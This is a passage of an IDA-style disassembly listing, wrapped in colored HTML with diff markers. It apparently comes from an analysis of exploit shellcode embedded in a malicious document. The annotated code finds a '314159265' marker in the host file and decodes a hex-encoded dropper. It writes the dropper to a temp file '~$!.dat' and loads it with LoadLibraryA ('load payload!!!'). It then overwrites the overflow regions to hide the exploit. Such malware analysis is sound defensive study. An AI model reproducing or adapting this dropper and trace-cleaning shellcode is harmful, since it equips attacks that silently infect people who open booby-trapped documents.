+</span><span style="color:maroon">seg000:000001CE
+seg000:000001CE                         </span>@found<span style="color:navy">:                                 </span><span style="color:green">; CODE XREF: seg000:000001BDj
+</span><span style="color:maroon">seg000:000001CE </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:maroon">seg000:000001D0 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:000001D2 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000001D3 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000001D4 </span>FF 75 FC                                <span style="color:navy">push    [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001D7 </span>FF 55 A4                                <span style="color:navy">call    [ebp+(</span>_X.SetFilePointer<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001DA </span>FF 75 EC                                <span style="color:navy">push    [ebp+(</span>_X.dwSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span>; 243,663
+<span style="color:maroon">seg000:000001DD </span>6A 40                                   <span style="color:navy">push    </span><span style="color:green">40h
+</span><span style="color:maroon">seg000:000001DF </span>FF 55 B8                                <span style="color:navy">call    [ebp+(</span>_X.GlobalAlloc<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001E2 </span>89 45 E0                                <span style="color:navy">mov     [ebp+(</span>_X.pBuffer1<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:000001E5 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:000001E7 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000001E8 </span>8D 45 E4                                <span style="color:navy">lea     eax, [ebp+(</span>_X.dwReadSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001EB </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000001EC </span>FF 75 EC                                <span style="color:navy">push    [ebp+(</span>_X.dwSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 243663
+</span><span style="color:maroon">seg000:000001EF </span>FF 75 E0                                <span style="color:navy">push    [ebp+(</span>_X.pBuffer1<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001F2 </span>FF 75 FC                                <span style="color:navy">push    [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001F5 </span>FF 55 A8                                <span style="color:navy">call    [ebp+(</span>_X.ReadFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001F8 </span>68 35 33 00 30                          <span style="color:navy">push    </span><span style="color:green">30003335h
+</span><span style="color:maroon">seg000:000001FD </span>68 35 39 32 36                          <span style="color:navy">push    </span><span style="color:green">36323935h
+</span><span style="color:maroon">seg000:00000202 </span>68 33 31 34 31                          <span style="color:navy">push    </span><span style="color:green">31343133h
+</span><span style="color:maroon">seg000:00000207 </span>54                                      <span style="color:navy">push    esp             </span>; '314159265' + '\0'
+<span style="color:maroon">seg000:00000208 </span>FF 75 E0                                <span style="color:navy">push    [ebp+(</span>_X.pBuffer1<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000020B </span>FF 55 C0                                <span style="color:navy">call    [ebp+(</span>_X.strstr<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000020E </span>85 C0                                   <span style="color:navy">test    eax, eax
+</span><span style="color:maroon">seg000:00000210 </span>0F 84 CB 00 00 00                       <span style="color:navy">jz      </span>@exit
+<span style="color:maroon">seg000:00000216 </span>83 C0 0A                                <span style="color:navy">add     eax, </span><span style="color:green">0Ah
+</span><span style="color:maroon">seg000:00000219 </span>89 45 DC                                <span style="color:navy">mov     [ebp+(</span>_X.pMzOff<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:0000021C </span>8B F0                                   <span style="color:navy">mov     esi, eax
+</span><span style="color:maroon">seg000:0000021E </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:0000021F </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:00000220 </span>59                                      <span style="color:navy">pop     ecx             </span>; stack balance
+<span style="color:maroon">seg000:00000221 </span>FF 75 F4                                <span style="color:navy">push    [ebp+(</span>_X.dwDrpSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 11EC8h
+</span><span style="color:maroon">seg000:00000224 </span>6A 40                                   <span style="color:navy">push    </span><span style="color:#ff8000">40h </span><span style="color:gray">; '@'
+</span><span style="color:maroon">seg000:00000226 </span>FF 55 B8                                <span style="color:navy">call    [ebp+(</span>_X.GlobalAlloc<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000229 </span>89 45 D8                                <span style="color:navy">mov     [ebp+(</span>_X.pBuffer2<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:0000022C </span>8B F8                                   <span style="color:navy">mov     edi, eax
+</span><span style="color:maroon">seg000:0000022E </span>33 DB                                   <span style="color:navy">xor     ebx, ebx
+</span><span style="color:maroon">seg000:00000230
+seg000:00000230                         </span>asc2hex<span style="color:navy">:                                </span><span style="color:green">; CODE XREF: seg000:0000024Ej
+</span><span style="color:maroon">seg000:00000230 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:00000232 </span>66 8B 04 5E                             <span style="color:navy">mov     ax, [esi+ebx*2]
+</span><span style="color:maroon">seg000:00000236 </span>89 45 C4                                <span style="color:navy">mov     [ebp+(</span>_X.dwSizeH<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:00000239 </span>8D 45 C4                                <span style="color:navy">lea     eax, [ebp+(</span>_X.dwSizeH<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000023C </span>6A 10                                   <span style="color:navy">push    </span><span style="color:green">16
+</span><span style="color:maroon">seg000:0000023E </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:maroon">seg000:00000240 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:00000241 </span>FF 55 BC                                <span style="color:navy">call    [ebp+(</span>_X.strtoul<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000244 </span>83 C4 0C                                <span style="color:navy">add     esp, </span><span style="color:green">0Ch
+</span><span style="color:maroon">seg000:00000247 </span>88 04 3B                                <span style="color:navy">mov     [ebx+edi], al   </span>; edi -&gt; pBuffer2
+<span style="color:maroon">seg000:0000024A </span>43                                      <span style="color:navy">inc     ebx
+</span><span style="color:maroon">seg000:0000024B </span>3B 5D F4                                <span style="color:navy">cmp     ebx, [ebp+(</span>_X.dwDrpSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 11EC8h
+</span><span style="color:maroon">seg000:0000024E </span>75 E0                                   <span style="color:navy">jnz     short </span>asc2hex
+<span style="color:maroon">seg000:0000024E
+seg000:0000024E
+seg000:00000250 </span>8B C0                                   <span style="color:navy">mov     eax, eax
+</span><span style="color:maroon">seg000:00000252 </span>FE C4                                   <span style="color:navy">inc     ah
+</span><span style="color:maroon">seg000:00000254 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:00000255 </span>6A 40                                   <span style="color:navy">push    </span><span style="color:#ff8000">40h </span><span style="color:gray">; '@'
+</span><span style="color:maroon">seg000:00000257 </span>FF 55 B8                                <span style="color:navy">call    [ebp+(</span>_X.GlobalAlloc<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000025A </span>89 45 D4                                <span style="color:navy">mov     [ebp+(</span>_X.pszXxx<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:0000025D </span>FF 75 D4                                <span style="color:navy">push    [ebp+(</span>_X.pszXxx<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000260 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:00000262 </span>FE C4                                   <span style="color:navy">inc     ah
+</span><span style="color:maroon">seg000:00000264 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:00000265 </span>FF 55 B4                                <span style="color:navy">call    [ebp+(</span>_X.GetTempPathA<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000268 </span>8B 7D D4                                <span style="color:navy">mov     edi, [ebp+(</span>_X.pszXxx<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000026B </span>03 F8                                   <span style="color:navy">add     edi, eax
+</span><span style="color:maroon">seg000:0000026D </span>B8 7E 24 21 2E                          <span style="color:navy">mov     eax, </span><span style="color:green">'.!$~'
+</span><span style="color:maroon">seg000:00000272 </span>AB                                      <span style="color:navy">stosd
+</span><span style="color:maroon">seg000:00000273 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:00000275 </span>B8 64 61 74 00                          <span style="color:navy">mov     eax, </span><span style="color:green">'tad'
+</span><span style="color:maroon">seg000:0000027A </span>AB                                      <span style="color:navy">stosd
+</span><span style="color:maroon">seg000:0000027B </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:maroon">seg000:0000027D </span>68 80 00 00 00                          <span style="color:navy">push    </span><span style="color:#ff8000">80h </span><span style="color:gray">; '€'
+</span><span style="color:maroon">seg000:00000282 </span>6A 02                                   <span style="color:navy">push    </span><span style="color:green">2
+</span><span style="color:maroon">seg000:00000284 </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:maroon">seg000:00000286 </span>6A 01                                   <span style="color:navy">push    </span><span style="color:green">1
+</span><span style="color:maroon">seg000:00000288 </span>68 00 00 00 40                          <span style="color:navy">push    </span><span style="color:green">40000000h
+</span><span style="color:maroon">seg000:0000028D </span>FF 75 D4                                <span style="color:navy">push    [ebp+(</span>_X.pszXxx<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000290 </span>FF 55 B0                                <span style="color:navy">call    [ebp+(</span>_X.CreateFileA<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:00000293 </span>83 F8 FF                                <span style="color:navy">cmp     eax, </span><span style="color:green">0FFFFFFFFh
+</span><span style="color:maroon">seg000:00000296 </span>74 49                                   <span style="color:navy">jz      short </span>@exit
+<span style="color:maroon">seg000:00000298 </span>89 45 F8                                <span style="color:navy">mov     [ebp+(</span>_X.hFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax
+</span><span style="color:maroon">seg000:0000029B </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:maroon">seg000:0000029D </span>8D 45 E8                                <span style="color:navy">lea     eax, [ebp+(</span>_X.dwWriteSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002A0 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000002A1 </span>FF 75 F4                                <span style="color:navy">push    [ebp+(</span>_X.dwDrpSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 11EC8h
+</span><span style="color:maroon">seg000:000002A4 </span>FF 75 D8                                <span style="color:navy">push    [ebp+(</span>_X.pBuffer2<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002A7 </span>FF 75 F8                                <span style="color:navy">push    [ebp+(</span>_X.hFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002AA </span>FF 55 AC                                <span style="color:navy">call    [ebp+(</span>_X.WriteFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002AD </span>FF 75 F8                                <span style="color:navy">push    [ebp+(</span>_X.hFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002B0 </span>FF 55 9C                                <span style="color:navy">call    [ebp+(</span>_X.CloseHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002B3 </span>FF 75 D4                                <span style="color:navy">push    [ebp+(</span>_X.pszXxx<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002B6 </span>FF 55 A0                                <span style="color:navy">call    [ebp+(</span>_X.LoadLibraryA<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span>; load payload!!!
+<span style="color:maroon">seg000:000002B6
+seg000:000002B6
+seg000:000002B9 </span>FF 75 A4                                <span style="color:navy">push    [ebp+(</span>_X.SetFilePointer<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002BC </span>FF 75 AC                                <span style="color:navy">push    [ebp+(</span>_X.WriteFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002BF </span>FF 75 C8                                <span style="color:navy">push    [ebp+(</span>_X.dwTriggerOff<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 14Bh
+</span><span style="color:maroon">seg000:000002C2 </span>FF 75 CC                                <span style="color:navy">push    [ebp+(</span>_X.dwOverflowSize1<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 611h
+</span><span style="color:maroon">seg000:000002C5 </span>FF 75 FC                                <span style="color:navy">push    [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002C8 </span>E8 F8 FD FF FF                          <span style="color:navy">call    </span>clean_wrapper   <span style="color:gray">; overwrite &quot;0x0d&quot; from 'offset' of length 'dwSize'
+</span><span style="color:maroon">seg000:000002C8
+seg000:000002C8
+seg000:000002CD </span>FF 75 A4                                <span style="color:navy">push    [ebp+(</span>_X.SetFilePointer<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002D0 </span>FF 75 AC                                <span style="color:navy">push    [ebp+(</span>_X.WriteFile<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002D3 </span>FF 75 D0                                <span style="color:navy">push    [ebp+(</span>_X.dwDrpperOff<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 17A33h
+</span><span style="color:maroon">seg000:000002D6 </span>FF 75 F0                                <span style="color:navy">push    [ebp+(</span>_X.dwOverflowSize2<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 23D9Ch
+</span><span style="color:maroon">seg000:000002D9 </span>FF 75 FC                                <span style="color:navy">push    [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000002DC </span>E8 E4 FD FF FF                          <span style="color:navy">call    </span>clean_wrapper   <span style="color:gray">; overwrite &quot;0x0d&quot; from 'offset' of length 'dwSize'
+</span><span style="color:maroon">seg000:000002E1
+seg000:000002E1                         </span>@exit<span style="color:navy">:                                  </span><span style="color:green">; CODE XREF: seg000:000001C6j
+</span><span style="color:maroon">seg000:000002E1                                                                 </span><span style="color:green">; seg000:00000210j ...
+</span><span style="color:maroon">seg000:000002E1 </span>8B E5                                   <span style="color:navy">mov     esp, ebp
+</span><span style="color:maroon">seg000:000002E3 </span>61                                      <span style="color:navy">popa
+</span><span style="color:maroon">seg000:000002E4 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002E5 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002E6 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002E7 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002E8 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002E9 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:000002EA </span>5D                                      <span style="color:navy">pop     ebp
+</span><span style="color:maroon">seg000:000002EB </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:maroon">seg000:000002ED </span>C2 10 00                                <span style="color:navy">retn    </span><span style="color:green">10h
+</body></html>
